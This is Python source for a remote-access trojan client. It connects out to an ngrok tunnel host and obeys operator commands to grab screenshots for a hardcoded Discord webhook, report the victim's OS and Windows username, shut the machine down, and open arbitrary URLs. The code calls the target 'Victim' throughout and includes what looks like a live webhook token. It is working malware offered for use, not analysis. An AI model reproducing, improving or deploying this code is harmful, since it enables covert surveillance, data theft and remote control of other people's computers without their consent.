import socket
from typing import *
import sys
import os
import webbrowser
import discord_webhooks
from PIL import ImageGrab
class Client():
    def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
        self.client=c
        self._recv()
    def _recv(self) -> None:
        # Receive Command
        self.command=self.client.recv(1024).decode()
        # Screenshot
        if self.command=="screenshot":
            self.send_screenshot_to_discord()
            self.client.send("Sending Screenshot To Discord".encode()) # Read Webhook From Config File (Future)
        # Operating System Name
        if self.command=="os_name":
            self.client.send(f"Victim Is Using {self.os_name}".encode())
        # Windows Username
        if self.command=="windows_username":
            try:
                import win32api
                self.client.send(f"Victim's Windows Username : {win32api.GetUserName()}".encode())
            except ImportError:
                self.client.send("win32api Isn't Installed In Victim's PC Or Victim Is Not Using Windows".encode())
        # Shutdown PC
        if self.command=="shutdown_pc":
            # Get Operating System Type
            if self.os_name=="windows":
                self.client.send("Shutting Down Victim's PC!".encode())
                os.system("shutdown /s /t 1")
            elif self.os_name=="macos":
                self.client.send("Shutting Down Victim's PC!".encode())
                os.system("shutdown -h now")
            else:
                self.client.send("Shutting Down Victim's PC!".encode())
                os.system("poweroff")
        # Open URL
        if self.command.startswith("open_url"):
            _,_URL_TO_OPEN=self.command.split()
            webbrowser.open(_URL_TO_OPEN)
            self.client.send(f"Opening {_URL_TO_OPEN} In Victim's PC!".encode())
    @property
    def os_name(self) -> str:
        if sys.platform=="win32":
            return "windows"
        elif sys.platform=="darwin":
            return "macos"
        elif sys.platform=="linux":
            return "linux"
        else:
            return "other"
    def send_screenshot_to_discord(self):
        webhook=discord_webhooks.DiscordWebhooks("https://discord.com/api/webhooks/1048155720031420436/-ARmdlaFvJyb-6iKCWb-uNXIgO9M6zMbpt4MR85rfL8mqEIXXZr7we-L8XNG9aGSAORy")
        webhook.set_footer(text="D A R K N E S S")
        webhook.send()
    @staticmethod
    def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
        c=socket.socket()
        c.connect((_addr,_port))
        return c,_addr
if __name__ == "__main__":
    c,addr=Client.init_socket("0.tcp.in.ngrok.io",13472)
    client=Client(c,addr)